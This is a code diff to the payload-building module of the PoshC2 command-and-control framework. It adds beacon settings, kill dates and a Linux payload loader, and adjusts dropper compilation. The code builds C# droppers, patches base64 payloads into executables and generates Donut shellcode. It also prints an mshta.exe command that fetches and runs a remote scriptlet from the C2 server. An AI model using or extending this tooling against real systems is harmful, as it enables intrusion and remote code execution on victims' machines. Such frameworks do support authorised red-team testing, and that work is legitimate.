@@ -2,11 +2,17 @@ from io import StringIO
 import gzip, base64, subprocess, os, hashlib, shutil, re, donut, importlib
 from enum import Enum
 
+from subprocess import Popen
+import time
+from datetime import datetime
+from urllib.parse import urlparse
+
 from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, PayloadModulesDirectory
 from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, PayloadDomainCheck as DefaultPayloadDomainCheck , StageRetries, StageRetriesInitialWait, StageRetriesLimit, FCommFileName as DefaultFCommFileName
 from poshc2.Colours import Colours
 from poshc2.Utils import gen_key, randomuri, formStr, offsetFinder, get_first_url, get_first_dfheader
-from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item
+from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item, get_otherbeaconurls, get_killdate, get_defaultbeacon
+from poshc2.server.Core import get_images
 
 
 class PayloadType(Enum):
@@ -55,6 +61,10 @@ class Payloads(object):
         self.StageRetriesInitialWait = StageRetriesInitialWait
         self.PSDropper = ""
         self.PyDropper = ""
+        self.AllBeaconURLs=get_otherbeaconurls()
+        self.AllBeaconImages=get_images()
+        self.KillDate=get_killdate()
+        self.Sleep=get_defaultbeacon()
 
         if os.path.exists("%saes.py" % PayloadsDirectory):
             with open("%saes.py" % PayloadsDirectory, 'r') as f:
@@ -234,9 +244,6 @@ class Payloads(object):
             f.write(str(content))
 
         subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
-
-        subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
-
         os.rename("%sPB.exe" % (self.BaseDirectory), "%s%spbind_cs.exe" % (self.BaseDirectory, name))
 
         # FComm CSharp Dropper
@@ -252,9 +259,9 @@ class Payloads(object):
                 f.write(str(content))
 
             subprocess.check_output("mono-csc %s%sfcomm.cs -out:%sFC.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
+            os.rename("%sFC.exe" % (self.BaseDirectory), "%s%sfcomm_cs.exe" % (self.BaseDirectory, name))
 
             subprocess.check_output("mono-csc %s%sfcomm.cs -out:%sFC.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
-
             os.rename("%sFC.exe" % (self.BaseDirectory), "%s%sfcomm_cs.exe" % (self.BaseDirectory, name))
 
     def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
@@ -262,7 +269,7 @@ class Payloads(object):
         with open(filename, 'wb') as f:
             f.write(base64.b64decode(dll))
         srcfilename = ""
-
+        patchlenbytes = 30000
         if payloadtype == PayloadType.Posh_v2:
             srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs_ps_v2.exe")
 
@@ -283,6 +290,7 @@ class Payloads(object):
 
         with open(srcfilename, "rb") as f:
             dllbase64 = f.read()
+
         dllbase64 = base64.b64encode(dllbase64).decode("utf-8")
         patchlen = 30000 - len((dllbase64))
         patch = dllbase64
@@ -292,7 +300,7 @@ class Payloads(object):
 
         with open(filename, "r+b") as f:
             f.seek(offset)
-            f.write(bytes(patch3, 'UTF-16LE'))
+            f.write(bytes(patch3, 'UTF-8'))
 
         self.QuickstartLog("Payload written to: %s" % (filename))
 
@@ -364,7 +372,7 @@ class Payloads(object):
             f.write(content)
 
         self.QuickstartLog(Colours.END)
-        self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % f"{self.FirstURL}/{self.QuickCommand}_cs")
+        self.QuickstartLog("mshta.exe 'vbscript:GetObject(\"script:%s\")(window.close)'" % f"{self.FirstURL}/{self.QuickCommand}_cs")
         with open("%sdropper_cs.sct" % (PayloadTemplatesDirectory), 'r') as f:
             content = f.read()
         content = str(content) \
@@ -741,6 +749,7 @@ class Payloads(object):
         elif payloadtype == PayloadType.FCommSharp:
             sourcefile = "fcomm_cs.exe"
 
+
         shellcode32 = donut.create(file=f"{self.BaseDirectory}{name}{sourcefile}", arch=1)
         if shellcode32:
             output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x86_Shellcode.bin", 'wb')
@@ -824,6 +833,18 @@ class Payloads(object):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog(f"pbind-connect hostname {self.PBindPipeName} {self.PBindSecret}")
     
+    def BuildLinuxPayloads(self, name):
+
+        for payload_module_file in os.listdir(PayloadModulesDirectory):
+            if not payload_module_file.endswith("Linux.py"):
+                continue
+            if __file__.endswith(f"/{payload_module_file}") or payload_module_file == "__init__.py":
+                continue
+            payload_module = os.path.splitext(payload_module_file)[0]
+            module = importlib.import_module(f'poshc2.server.payloads.{payload_module}')
+            shellcode_function = getattr(module, "create_payloads")
+            shellcode_function(self, name)
+
     def BuildDynamicPayloads(self, name):
 
         for payload_module_file in os.listdir(PayloadModulesDirectory):
